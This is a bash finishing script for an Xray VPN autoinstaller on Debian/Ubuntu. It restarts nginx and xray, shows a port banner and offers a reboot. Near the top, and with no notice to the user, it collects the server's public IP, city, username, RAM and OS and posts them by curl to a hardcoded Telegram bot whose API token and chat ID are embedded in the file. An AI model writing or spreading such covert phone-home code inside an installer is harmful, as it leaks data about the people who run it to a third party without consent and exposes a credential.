#!/bin/bash
# //====================================================
# //	System Request:Debian 9+/Ubuntu 18.04+/20+
# //	Author:	rijal andra
# //	Dscription: Xray Menu Management
# //	email: admin@rijal andra.com
# //  telegram: https://t.me/bhoikfost_yahya
# //====================================================

# // FONT color configuration | RIJAL ANDRA AUTOSCRIPT
Green="\e[92;1m"
RED="\033[31m"
YELLOW="\033[33m"
BLUE="\033[36m"
FONT="\033[0m"
GREENBG="\033[42;37m"
REDBG="\033[41;37m"
OK="${Green}--->${FONT}"
ERROR="${RED}[ERROR]${FONT}"
GRAY="\e[1;30m"
NC='\e[0m'

# // configuration GET | RIJAL ANDRA AUTOSCRIPT
TIMES="10"
NAMES=$(whoami)
IMP="wget -q -O"
CHATID="1118232400"
LOCAL_DATE="/usr/bin/"
MYIP=$(wget -qO- ipinfo.io/ip)
CITY=$(curl -s ipinfo.io/city)
TIME=$(date +'%Y-%m-%d %H:%M:%S')
RAMMS=$(free -m | awk 'NR==2 {print $2}')
KEY="5661986467:AAHRhgKFp9N5061gZtZ6n4Ae4BJF3PmQ188"
URL="https://api.telegram.org/bot$KEY/sendMessage"
GITHUB_CMD="https://github.com/rullpqh/Autoscript-vps/raw/"
OS=$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')


TEXT="
<u>INFORMASI VPS INSTALL SC</u>
TIME     : <code>${TIME}</code>
IPVPS     : <code>${MYIP}</code>
DOMAIN   : <code>${domain}</code>
IP VPS       : <code>${MYIP}</code>
LOKASI       : <code>${CITY}</code>
USER         : <code>${NAMES}</code>
RAM          : <code>${RAMMS}MB</code>
LINUX       : <code>${OS}</code>
"
    curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
    sed -i "s/xxx/${domain}/g" /var/www/html/index.html >/dev/null 2>&1
    sed -i "s/xxx/${domain}/g" /etc/nginx/conf.d/xray.conf >/dev/null 2>&1
    sed -i -e 's/\r$//' /usr/bin/get-backres >/dev/null 2>&1
    sed -i -e 's/\r$//' /usr/bin/get-bw >/dev/null 2>&1
    sed -i -e 's/\r$//' /usr/bin/get-detail >/dev/null 2>&1
    sed -i -e 's/\r$//' /usr/bin/get-log >/dev/null 2>&1
    chown -R www-data:www-data /etc/msmtprc >/dev/null 2>&1
    systemctl daemon-reload >/dev/null 2>&1
    systemctl enable nginx >/dev/null 2>&1
    systemctl enable xray >/dev/null 2>&1
    systemctl restart nginx >/dev/null 2>&1
    systemctl restart xray >/dev/null 2>&1
    clear
    LOGO
    echo "    ┌───────────────────────────────────────────────────────┐"
    echo "    │       >>> Service & Port                              │"
    echo "    │   - XRAY  Vmess TLS         : 443                     │"
    echo "    │   - XRAY  Vmess gRPC        : 443                     │"
    echo "    │   - XRAY  Vmess None TLS    : 80                      │"
    echo "    │   - XRAY  Vless TLS         : 443                     │"
    echo "    │   - XRAY  Vless gRPC        : 443                     │"
    echo "    │   - XRAY  Vless None TLS    : 80                      │"
    echo "    │   - Trojan gRPC             : 443                     │"
    echo "    │   - Trojan WS               : 443                     │"
    echo "    │   - Shadowsocks WS          : 443                     │"
    echo "    │   - Shadowsocks gRPC        : 443                     │"
    echo "    │                                                       │"
    echo "    │      >>> Server Information & Other Features          │"
    echo "    │   - Timezone                : Asia/Jakarta (GMT +7)   │"
    echo "    │   - Autoreboot On           : $AUTOREB:00 $TIME_DATE GMT +7          │"
    echo "    │   - Auto Delete Expired Account                       │"
    echo "    │   - Fully automatic script                            │"
    echo "    │   - VPS settings                                      │"
    echo "    │   - Admin Control                                     │"
    echo "    │   - Restore Data                                      │"
    echo "    │   - Full Orders For Various Services                  │"
    echo "    └───────────────────────────────────────────────────────┘"
    secs_to_human "$(($(date +%s) - ${start}))"
    echo -ne "         ${YELLOW}Please Reboot Your Vps${FONT} (y/n)? "
    read REDDIR
    if [ "$REDDIR" == "${REDDIR#[Yy]}" ] ;then
        exit 0
    else
        reboot
    fi    
